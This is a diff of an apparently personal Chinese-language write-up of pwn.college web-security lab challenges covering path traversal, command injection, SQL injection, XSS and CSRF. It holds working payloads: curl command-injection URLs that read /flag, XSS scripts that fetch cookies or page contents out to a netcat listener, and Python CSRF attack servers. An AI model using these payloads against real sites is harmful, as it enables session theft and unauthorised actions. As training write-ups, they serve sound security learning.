@@ -1,4 +1,4 @@
-# 1-Path Traversal
+# 01-Path Traversal
 
 在看到题目后，我将一系列内容扔给gpt。
 
@@ -85,7 +85,7 @@ if __name__ == '__main__':
 
 首先，我不确定利用../是否可以就此切换目录，于是我使用cat进行实验
 
-![image-20241031185655670](.\2 Web Security.assets\image-20241031185655670.png)
+![image-20241031185655670](./02%20Web%20Security.assets/image-20241031185655670.png)
 
 成功。
 
@@ -99,11 +99,11 @@ if __name__ == '__main__':
 
 curl:
 
-![image-20241031190115107](.\2 Web Security.assets\image-20241031190115107.png)
+![image-20241031190115107](./02%20Web%20Security.assets/image-20241031190115107.png)
 
 ipython:
 
-![image-20241031190328611](.\2 Web Security.assets\image-20241031190328611.png)
+![image-20241031190328611](./02%20Web%20Security.assets/image-20241031190328611.png)
 
 这怎么办？
 
@@ -113,7 +113,7 @@ ipython:
 
 于是转换后：
 
-![image-20241031190436328](.\2 Web Security.assets\image-20241031190436328.png)
+![image-20241031190436328](./02%20Web%20Security.assets/image-20241031190436328.png)
 
 成功。
 
@@ -145,7 +145,7 @@ GET /../../flag HTTP/1.1
 
 
 
-# 2-Path Traversal2
+# 02-Path Traversal2
 
 ## strip
 
@@ -196,7 +196,7 @@ tratfatf!!!!!!!******Hello, !!!!!!!********World
 
 多出来一些东西：
 
-![image-20241101120756275](.\2 Web Security.assets\image-20241101120756275.png)
+![image-20241101120756275](./02%20Web%20Security.assets/image-20241101120756275.png)
 
 所以我们可以利用这个多出来的目录，进行绕过`./`。
 
@@ -210,7 +210,7 @@ $ curl -v challenge.localhost:80/fortunes%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fflag
 
 
 
-# 3-cmdi-1
+# 03-cmdi-1
 
 思路很简单
 
@@ -228,7 +228,7 @@ ls -l  ; cat /flag
 $ curl -v http://challenge.localhost:80/?directory=%20%3B%20cat%20%2Fflag
 ```
 
-# 4-cmdi-2
+# 04-cmdi-2
 
 ## 描述
 
@@ -254,7 +254,7 @@ curl -v http://challenge.localhost:80/?directory=%2Fchallenge%20%26%26%20cat%20%
 
 
 
-# 5-cmdi-3
+# 05-cmdi-3
 
 什么叫做专业呢？
 
@@ -316,7 +316,7 @@ curl -v http://challenge.localhost:80/?directory=%27%20%3B%20cat%20%2Fflag%20%3B
 
 
 
-# 6-cmdi-4
+# 06-cmdi-4
 
 ## 描述
 
@@ -340,7 +340,7 @@ curl -v http://challenge.localhost:80/?timezone=%3B%20cat%20%2Fflag%20%23
 
 
 
-# 7-cmdi-5
+# 07-cmdi-5
 
 ## 问题描述
 
@@ -362,7 +362,7 @@ url编码，请求后，/home/hacker/flag就会出现，读就行了。
 
 
 
-# 8-cmdi-6
+# 08-cmdi-6
 
 ## 问题描述
 
@@ -378,7 +378,7 @@ url编码，请求后，/home/hacker/flag就会出现，读就行了。
 
 问gpt：
 
-![image-20241101172919385](./2%20Web%20Security.assets/image-20241101172919385.png)
+![image-20241101172919385](./02%20Web%20Security.assets/image-20241101172919385.png)
 
 所以需要的是换行符的url编码。
 
@@ -401,7 +401,7 @@ curl -v http://challenge.localhost:80/?directory=.%0Acat%20%2Fflag
 
 
 
-# 9-Authentication Bypass 1
+# 09-Authentication Bypass 1
 
 ## 问题描述
 
@@ -660,7 +660,7 @@ app.run("challenge.localhost", 80)
 
 跟上一道题一样，不过不同的地方是，post之后会存储cookies。
 
-![image-20241101185836097](.\2%20Web%20Security.assets\image-20241101185836097.png)
+![image-20241101185836097](./02%20Web%20Security.assets/image-20241101185836097.png)
 
 用guest登录之后，修改cookies里面的session_user为admin就行。
 
@@ -766,7 +766,7 @@ admin" OR "1" = "1
 
 拼接多个sql语句：
 
-![image-20241105140810906](./2%20Web%20Security.assets/image-20241105140810906.png)
+![image-20241105140810906](./02%20Web%20Security.assets/image-20241105140810906.png)
 
 一次只能执行一个sql语句。
 
@@ -802,7 +802,7 @@ pin
 
 如下图：
 
-![image-20241105142422722](./2%20Web%20Security.assets/image-20241105142422722.png)
+![image-20241105142422722](./02%20Web%20Security.assets/image-20241105142422722.png)
 
 
 
@@ -901,7 +901,7 @@ app.run("challenge.localhost", 80)
 
 注入即可
 
-![image-20241105155827986](./2%20Web%20Security.assets/image-20241105155827986.png)
+![image-20241105155827986](./02%20Web%20Security.assets/image-20241105155827986.png)
 
 ## exp
 
@@ -1037,33 +1037,475 @@ admin" union select password from users_7444461681 where username = "admin"--
 
 # 16-XSS-1
 
+首先要知道，什么是html，什么是css，什么是js。
 
+也就是前端三剑客。
+
+然后，仔细的阅读代码。server文件和victim文件。
+
+这一题中，server是干什么的？
+
+你输入什么，他就给写进html文件里。
+
+如图所示:
+
+![image-20241110174518840](./02%20Web%20Security.assets/image-20241110174518840.png)
+
+下图中红框内的东西都是我自己输入然后被写进html文件并且返回的。
+
+![image-20241110174631065](./02%20Web%20Security.assets/image-20241110174631065.png)
+
+那么victim文件又是干什么的呢？
+
+就是检测这个html里面是否有<input type = "text">。
+
+如果有，就返回flag。
+
+所以我们要做的就是写一个input进去。
 
 # 17-XSS-2
 
+the same like the previous one ,but you should post 
 
+```s
+<script>alter("PWNED")</script>
+```
+
+let's view the source code:
+
+![image-20241110180122494](./02%20Web%20Security.assets/image-20241110180122494.png)
+
+then run the victim to get the flag
 
 # 18-XSS-3
+
+you must pass an url as the argument to invoke the victim program
+
+and the argument "msg" of url should be alert()
+
+and you need to use the url encode
+
+```
+$ /challenge/victim "http://challenge.localhost:80?msg=%3Cscript%3Ealert%28%27PWNED%27%29%3C%2Fscript%3E"
+```
+
+也就是实现：
+
+```
+msg=<script>alert('PWNED')</script>
+```
 
 
 
 # 19-XSS-4
 
+exp
+
+```
+hacker@web-security~xss-4:~$ /challenge/victim "http://challenge.localhost:80/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript
+%3E%3Ctextarea%3E"
+```
+
+也就是实现：
+
+```
+msg=</textarea><script>alert("PWNED")</script><textarea>
+```
+
 
 
 # 20-XSS-5
 
+```javascript
+<script>
+// 获取表单中的提交按钮元素
+const publishButton = document.querySelector('form[action="publish"] input[type="submit"]');
 
+// 每秒自动点击一次该按钮
+setInterval(() => {
+    if (publishButton) {
+        publishButton.click();
+        console.log('Clicked on "Publish All Drafts" button');
+    } else {
+        console.log('Publish button not found.');
+    }
+}, 1000);  // 每1秒点击一次
+</script>
+```
+
+就是admin登录后就自动点击这个publish。
 
 # 21-XSS-6
+
+和5是一样的题解。我觉得我的题解是非预期解。
+
+```javascript
+<script>
+// 获取表单中的提交按钮元素
+const publishButton = document.querySelector('form[action="publish"] input[type="submit"]');
+
+// 每秒自动点击一次该按钮
+setInterval(() => {
+    if (publishButton) {
+        publishButton.click();
+        console.log('Clicked on "Publish All Drafts" button');
+    } else {
+        console.log('Publish button not found.');
+    }
+}, 1000);  // 每1秒点击一次
+</script>
+```
+
+我没有使用fecth。
 
 
 
 # 22-XSS-7
 
+就是带着cookie发送请求过去
+
+xss
+
+```js
+<script>
+    fetch("http://127.0.0.1:9876", {
+        method: "POST",
+        body: document.cookie,
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+    });
+</script>
+
+```
+
+nc
+
+```
+nc -lvp 9876
+```
 
 
 
 
 
+# 23-CSRF-1
+
+
+
+```python
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+
+class CSRFHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/":
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            # 将字符串转换为字节对象
+            self.wfile.write("""
+                <html>
+                  <body>
+                    <h1>CSRF Attack in Progress</h1>
+                    <script>
+                        // 自动跳转到目标站点
+                        window.location.href = "http://challenge.localhost/publish";
+                    </script>
+                  </body>
+                </html>
+            """.encode())  # .encode() 将字符串转换为字节对象
+
+server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
+print("CSRF attack server running at http://hacker.localhost:1337/")
+server.serve_forever()
+```
+
+原理：
+
+admin作为victim登录后，会主动去访问我们的1337端口。
+
+于是我们的1337端口的程序就要做点手脚了。
+
+server的代码里面什么也做不了。
+
+没有办法插入xss让admin登录之后就自动点击publish
+
+但是我们的1337程序就要自动跳转到publish
+
+这样我们随便登录就能看到admin的flag了。
+
+
+
+# 24-CSRF-2
+
+正错解，为什么呢？
+
+## 错解
+
+这个是：
+
+```python
+hacker@web-security~csrf-2:~$ cat ./csrf2.py 
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+
+class CSRFHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/":
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            # 将字符串转换为字节对象
+            self.wfile.write("""
+                <html>
+                  <body>
+                    <h1>CSRF Attack in Progress</h1>
+                    <script>
+                        // 使用 POST 请求模拟攻击
+                        fetch("http://challenge.localhost/publish", {
+                            method: "POST", 
+                            headers: {
+                                "Content-Type": "application/x-www-form-urlencoded"
+                            },
+                            body: ""  // 如果需要，可以添加额外的数据
+                        }).then(response => {
+                            console.log("Request sent successfully!");
+                        }).catch(error => {
+                            console.log("Request failed", error);
+                        });
+                    </script>
+                  </body>
+                </html>
+            """.encode())  # .encode() 将字符串转换为字节对象
+
+server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
+print("CSRF attack server running at http://hacker.localhost:1337/")
+server.serve_forever()
+```
+
+## 正解
+
+这个是
+
+```python
+
+
+hacker@web-security~csrf-2:~$ vim ./csrf
+hacker@web-security~csrf-2:~$ vim ./csrf2.py 
+hacker@web-security~csrf-2:~$ cat ./csrf2.py 
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+
+class CSRFHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/":
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+
+            # Inject an HTML form into the page and submit it using JavaScript
+            self.wfile.write("""
+                <html>
+                  <body>
+                    <h1>CSRF Attack in Progress</h1>
+                    <form id="csrfForm" action="http://challenge.localhost/publish" method="POST">
+                        <!-- You can add other required form fields here if needed -->
+                    </form>
+                    <script>
+                        // Automatically submit the form without user interaction
+                        document.getElementById("csrfForm").submit();
+                    </script>
+                  </body>
+                </html>
+            """.encode())
+
+server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
+print("CSRF attack server running at http://hacker.localhost:1337/")
+server.serve_forever()
+```
+
+非得自己写个form然后再跳转吗？
+
+# 25-CSRF-3
+
+正确的exp：
+
+```python
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+import urllib.parse
+
+class CSRFHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/":
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+
+            # 恶意消息
+            msg = '<script>alert("PWN: Success!")</script>'
+
+            # 对消息进行 URL 编码
+            encoded_msg = urllib.parse.quote(msg)
+
+            # 构造恶意 URL
+            payload = f'http://challenge.localhost:80/ephemeral?msg={encoded_msg}'
+
+            # 生成 HTML 页面并插入跳转脚本
+            self.wfile.write(f"""
+                <html>
+                  <body>
+                    <script>
+                        // 通过 JavaScript 强制跳转到包含恶意 payload 的 URL
+                        window.location.href = "{payload}";
+                    </script>
+                  </body>
+                </html>
+            """.encode())
+
+# 启动 HTTP 服务器
+server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
+print("CSRF attack server running at http://hacker.localhost:1337/")
+server.serve_forever()
+```
+
+诱导实现同源跳转，然后再注入xss进行alert。
+
+
+
+# 26-CSRF-4
+
+exp
+
+```py
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+import urllib.parse
+
+class CSRFHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/":
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+
+            # 恶意消息
+            msg = '<script>fetch("http://127.0.0.1:9876",{method:"POST",body:document.cookie,headers:{"Content-Type":"application/x-www-form-urlencoded"}});</script>'
+
+            # 对消息进行 URL 编码
+            encoded_msg = urllib.parse.quote(msg)
+
+            # 构造恶意 URL
+            payload = f'http://challenge.localhost:80/ephemeral?msg={encoded_msg}'
+
+            # 生成 HTML 页面并插入跳转脚本
+            self.wfile.write(f"""
+                <html>
+                  <body>
+                    <script>
+                        // 通过 JavaScript 强制跳转到包含恶意 payload 的 URL
+                        window.location.href = "{payload}";
+                    </script>
+                  </body>
+                </html>
+            """.encode())
+
+# 启动 HTTP 服务器
+server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
+print("CSRF attack server running at http://hacker.localhost:1337/")
+server.serve_forever()
+```
+
+还要开启一个端口，接受fetch：
+
+```
+nc -lvp 9876
+```
+
+诱导实现同源跳转，然后xss注入实现fetch发送cookie出去。
+
+
+
+---
+
+
+
+跳转到这个位置，发送cookie也行，我觉得可以直接发送flag。
+
+参考csrf5。
+
+# 27-CSRF-5
+
+不允许发送cookie出去了。
+
+那么我们该怎么办呢？
+
+我的一个想法是直接fetch这个flag文件。
+
+但是flag文件怎么获取到呢？
+
+---
+
+所以不会的时候，好好看题目，好好看源码。
+
+---
+
+
+
+真是开了眼了。
+
+很想扇我自己几巴掌。
+
+admin登录后直接就会显示flag。
+
+但是我们这里的victim是不显示登录界面的。
+
+所以我们只能在admin登录之后把他的界面发送过来。
+
+exp：
+
+```py
+#!/opt/pwn.college/python
+
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+import urllib.parse
+
+class CSRFHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/":
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+
+            # 构造恶意 JavaScript 脚本
+            msg = '<script>fetch("http://challenge.localhost:80/",{method:"GET"}).then(response => response.text()).then(data => {fetch("http://127.0.0.1:9876",{method:"POST",body:data,headers:{"Content-Type":"application/x-www-form-urlencoded"}});});</script>'
+
+            # 对消息进行 URL 编码
+            encoded_msg = urllib.parse.quote(msg)
+
+            # 构造恶意 URL
+            payload = f'http://challenge.localhost:80/ephemeral?msg={encoded_msg}'
+            # 生成 HTML 页面并插入跳转脚本
+            self.wfile.write(f"""
+                <html>
+                  <body>
+                    <script>
+                        // 通过 JavaScript 强制跳转到包含恶意 payload 的 URL
+                        window.location.href = "{payload}";
+                    </script>
+                  </body>
+                </html>
+            """.encode())
+
+# 启动 HTTP 服务器
+server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
+print("CSRF attack server running at http://hacker.localhost:1337/")
+server.serve_forever()
+
+
+```
+
+也就是fetch套fetch。
+
+除此之外，我们还需要在开一个端口来接收：
+
+```
+nc -lvp 9876
+```
 
